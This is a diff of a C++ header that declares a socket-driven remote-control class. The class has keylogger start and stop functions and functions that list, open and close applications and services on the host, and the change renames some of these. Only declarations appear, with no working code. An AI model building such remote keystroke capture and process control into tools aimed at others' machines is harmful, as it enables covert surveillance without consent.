@@ -65,12 +65,13 @@ private:
     void stopKeyLogger(SOCKET);
     void keyLogger();
     //List/Turn on/Turn off App
-    bool hasVisibleWindow(DWORD processID);
-    void ListApplications(SOCKET);
+    bool isBackgroundProcess(const wchar_t* processName);
+    bool hasVisibleWindow(const int processID);
+    void listApplications(SOCKET);
     void openProcess(const std::string& appName, SOCKET clientSocket);
     void closeProcess(const int processID, SOCKET clientSocket);
     //List/Turn on/Turn off services
-    void ListServices(SOCKET);
+    void listServices(SOCKET);
 };
 
 int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
